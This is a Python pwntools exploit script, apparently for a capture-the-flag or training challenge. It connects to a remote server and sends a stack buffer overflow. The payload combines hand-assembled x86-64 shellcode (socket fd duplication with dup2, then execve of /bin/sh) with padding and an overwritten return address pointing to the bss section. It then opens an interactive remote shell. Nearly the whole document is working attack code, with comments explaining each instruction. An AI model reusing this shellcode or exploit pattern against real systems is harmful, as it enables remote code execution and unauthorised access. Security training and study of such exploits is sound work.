from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

#r = remote("0.0.0.0", 44131) # running locally (change the port accordingly [sudo lsof -i -P -n])
r = remote("training.jinblack.it", 2005)
#r = process("./server") #not used

''' 
gdb.attach(r, """
	
	c        
""")
'''

# receive intro
print(r.clean())

input("wait")

''' 
mov    rax,0x20
mov    rdi,0x0
syscall		#dup to get current fd
mov    r9, rax	#get current fd and subtract 1 to get clients fd
add    r9, -1
mov    rax, 0x21
mov    rsi, 0x0
mov    rdi, r9
syscall		#replace stdin with clients fd
mov    rax, 0x21
mov    rsi, 0x1
mov    rdi, r9
syscall		#replace stdout with clients fd
'''
dup2 = b"\x48\xC7\xC0\x20\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x49\x89\xC1\x49\x83\xC1\xFF\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x4C\x89\xCF\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x4C\x89\xCF\x0F\x05"

'''
jmp endshellcode
shellcode:
pop rdi
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall		#execve with bin/sh and arguments set to 0

endshellcode:
call shellcode
nop		#replace with /bin/sh\0
'''
shellcode = b"\xEB\x10\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xEB\xFF\xFF\xFF/bin/sh\0"

bss_address = b"\xc0\x40\x40\x00\x00\x00\x00\x00"

overflow = (dup2 + shellcode).ljust(1016, b"A") + bss_address

r.send(overflow)

r.interactive()

